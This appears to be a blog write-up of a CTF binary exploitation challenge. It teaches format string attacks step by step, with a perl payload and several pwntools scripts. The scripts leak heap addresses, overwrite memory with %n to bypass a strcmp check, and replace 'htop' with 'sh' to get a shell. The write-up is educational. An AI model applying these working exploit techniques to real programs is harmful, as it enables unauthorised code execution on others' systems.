---
layout: post
title:  "Solving Pwn-02 from e-Security 2018 CTF"
date:   2019-01-05 12:30:00 -0300
categories: ctf, write-up
---

# Introduction

Hello again. This time we are going to nail the second Pwn (binary exploitation) challenge I have developed for e-Security CTF in 2018.

This time we are no longer traveling through newbie stuff. It is expected that the reader have some comfort with 32-bit assembly (i386), debugging, how C works and more importantly, how FORMAT STRINGS works, because this challenge is all about them!

You can download this exploitable binary directly from this [LINK](/assets/htopwned) !

# What is a format string?

In programming, this is a format string occurrence:

```c
include <stdio.h>

int main(void) 
{
    char *name = "Andre Marques";
    printf("My name is %s\n", name);
    return 0;
}
```

Compile the above code and see that "%s" is switched to "Andre Marques". This is a format string.

![Screenshot](/assets/pwn2-02.png)

# Analyzing the binary

PS: "Jumping" here means Hijack program execution flow by using a JMP, CALL or RET instruction.

The first step to exploit something is to check it's defenses. Knowing your enemy defenses will enlighten your mind to walk the right path that can lead to a breach. 

![Screenshot](/assets/pwn2-01.png)

Again, we are dealing with 32-bit ELF binary. The main difference from this one to the previous challenge is that NX is enabled. Which means our stack memory pages have the executable bit not set, which means we cannot jump to stack.

To our luck, we have PIE disabled. Which means every instruction in this binary file have fixed memory addresses. We could jump to them, instead of jumping to the stack. 

The downside of jumping to binary instruction is that we do not control them. They are there already, and are immutable. Most of instructions are useless to us.

# Analyzing execution flow

After this statical analysis of binary defenses, let's see what the binary does.

![Screenshot](/assets/pwn2-03.png)

It is a program that asks for Yes or No and then opens "htop" program if the user says "Yes". Simple as that. But one thing we can notice is that these memory addresses displayed to us belong to heap memory space. This is important, because which means it is a writable space that we might be able to influence upon.

# Disassembly. Knowing the enemy.

Disassemble the main function to understand what is going on in background:

![Screenshot](/assets/pwn2-04.png)

Observe that it uses malloc two times with the same value - 0x200 - which means that our "choice" and "input" buffers are really heap memory addresses.

Now let's watch how the program influence or alters these mentioned buffers by inspecting the subsequent function calls.

![Screenshot](/assets/pwn2-05.png)

As you already know, fgets() is implemented correctly. This is not a buffer overflow challenge.

# Let the black magic begin

Format strings are exploitable. But hey, not all of them. Just the ones that gives us complete control over the format string. Still doesn't ring a bell? Check this.

![Screenshot](/assets/pwn4-06.png)

This way we can READ any memory from the process! That's awesome. But won't help us... We have nothing useful to be read in this memory space. 

But format string vulnerabilities are not only meant to read memory. They can write to memory too!

# Exploitation Logic

We have a program that start a process. But this process is always "htop" tool because the program have it FIXED in it's memory. 

What if we corrupt the memory using format string and switch "htop" for "sh"? That would lead the program to open a shell instead of htop tool, right? 

But that's not so simple. Writing arbitrary values to memory using format string is a very complex process that I will do my best to try to explain.

# What to write? Where?

Let's begin. To learn by myself I have used only a single PDF file, which is this [one](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)

*Please read the PDF. It is very extensive process, and this post would have a lot of pages if I start from the bottom.*

There is two inital tasks that must be completed with a single payload:

1. We need to corrupt the user input buffer to write "y" as it is required to start the process.
2. We need to corrupt the process name that is going to be started, which is always "htop".

For that, we will need to write a script that is able to retrieve that "choice" and "input" memory addresses so we can forge format strings to write into them.

# Retrieving data from pipes using PwnTools

PwnTools is an excellent tool to aid in binary exploitation for CTF challenges. We need to write a script that is able to read the memory addresses value each time and store them into variables, because ever time we run the binary it will be different. 

This is mine:

```python
#!/usr/bin/env python

from pwn import *
from time import sleep

def get_pointer_addr(process):
    return int(process.recvuntil("\n").strip("\n"), 16)

p = process("./htopwned")
sleep(2)

# This retrieves choice variable pointer and stores it integer value
p.recvuntil("choice => ")
choice_addr = get_pointer_addr(p)

# This retrieves input variable pointer and stores it integer value
p.recvuntil("input  => ")
input_addr = get_pointer_addr(p)

print("Choice variable is in memory address %x" % choice_addr)
print("Input variable is in memory address %x" % input_addr)
```

Execute the above script and you will notice that it works and is able to get the value, each time.

![Screenshot](/assets/pwn2-07.png)

# Writing "y\n" to "input" variable using format strings

Now we need to forge a payload that is able to write into an abritrary memory address.

In gdb peda, ASLR is always turned off, so in gdb we have always the same memory addresses. In mine, choice variable was always in 0x804b160.
Check this:

```bash
$ perl -e 'print pack("I", 0x804b160) . "AAAA" . "%x%x%8x%n"' > /tmp/payload.txt
```

Now you can run the following in gdb:

```bash
gdb> r < /tmp/payload.txt
```

This will automatically use our payload in fgets() when the time comes.

Now observe the address 0x804b160 before vnsprintf is run by the program.

![Screenshot](/assets/pwn2-08.png)

And now, after vnsprintf call.

![Screenshot](/assets/pwn2-09.png)

This value - 0x18 - was overwritten during vnsprintf, now it is time to change 0x18 to something else more useful. Our target is to write "y" and a new line over that memory address.

This value - 0x18 - is not useful, but we can control what value will be written by using a formula:

![Screenshot](/assets/pwn2-11.png)

Now create a new payload with that number instead of %8x:

![Screenshot](/assets/pwn2-12.png)

And see what happens in debugger, right before strcmp call:

![Screenshot](/assets/pwn2-13.png)

After this payload, we are able to completely bypass the strcmp() call and proceed to htop process spawn.

Our current exploit code is the following:

```python
#!/usr/bin/env python

from pwn import *
from time import sleep

def get_pointer_addr(process):
    return int(process.recvuntil("\n").strip("\n"), 16)

p = process("./htopwned")
sleep(2)

# This retrieves choice variable pointer and stores it integer value
p.recvuntil("choice => ")
choice_addr = get_pointer_addr(p)

# This retrieves input variable pointer and stores it integer value
p.recvuntil("input  => ")
input_addr = get_pointer_addr(p)

print("Choice variable is in memory address 0x%x" % choice_addr)
print("Input variable is in memory address 0x%x" % input_addr)


bypass_strcmp = 1157630569

payload = p32(choice_addr) + "AAAA" + "%x%x%{0}x%n".format(bypass_strcmp)

p.recv()
p.sendline(payload)
sleep(2)
print(p.recv())
```

And you should be seeing this output from it:

![Screenshot](/assets/pwn2-14.png)

Now it is the last step for a successful exploitation: Switching "htop" to "sh" so we are able to get a shell!

# Corrupting the last memory spot

We need to corrupt where "htop" string resides. If it was static declared string, it would not be possible, due to being a Read-Only memory address space. But as we observed from before, it is heap memory, so it globally writeable memory, so it is possible to corrupt as well!

It is exactly the same methodology as we have done to bypass strcmp() call, so I will not replay everything I told in the last topic, instead, I will show how the code changes have gone to achieve this objective:

```python
#!/usr/bin/env python

from pwn import *
from time import sleep


def get_pointer_addr(process):
    return int(process.recvuntil("\n").strip("\n"), 16)

p = process("./htopwned")
sleep(2)

# This retrieves choice variable pointer and stores it integer value
p.recvuntil("choice => ")
choice_addr = get_pointer_addr(p)

# This retrieves input variable pointer and stores it integer value
p.recvuntil("input  => ")
input_addr = get_pointer_addr(p)

print("Choice variable is in memory address 0x%x" % choice_addr)
print("Input variable is in memory address 0x%x" % input_addr)

# Corrupt both memory addresses now
# Bypassing strcmp() and changing "htop" to "sh"
payload = p32(choice_addr) + "AAAA" + p32(input_addr) + "%x%x%1157630565x%n%24058x%n"

print(hexdump(payload))
p.recv()
p.sendline(payload)
sleep(2)
p.recv()
p.interactive()
```

Final output:

![Screenshot](/assets/pwn2-15.png)

# The End

I hope you learned something from this write-up, as I enjoyed a lot creating this exercise for this CTF competition.

Best regards,

zc00l.